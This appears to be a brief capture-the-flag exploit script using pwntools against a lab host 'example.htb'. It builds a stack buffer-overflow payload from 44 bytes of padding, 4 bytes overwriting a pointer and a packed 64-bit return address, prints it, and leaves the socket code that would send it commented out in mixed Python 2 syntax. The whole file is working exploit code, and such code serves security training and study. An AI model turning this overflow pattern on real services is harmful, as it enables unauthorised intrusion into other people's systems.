import pwn

host, port = "example.htb", 4372
buff = b'A' * 44 # Buffer = 44 bytes
ptr = b'A' * 4 # Pointer = 4 bytes
pwn_addr = pwn.p64(0x1337bab3) # the binary is 64bit, 0x1337bab3 --> b'\xb3\xba7\x13\x00\x00\x00\x00'

payload = buff + ptr + pwn_addr
print(payload)

# try:
# 	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# 	s.connect((host, port))
# 	s.send(payload)
# 	print(s.recv(1024))
# 	s.close()

# except:
# 	print "Error connecting to server"
# 	sys.exit()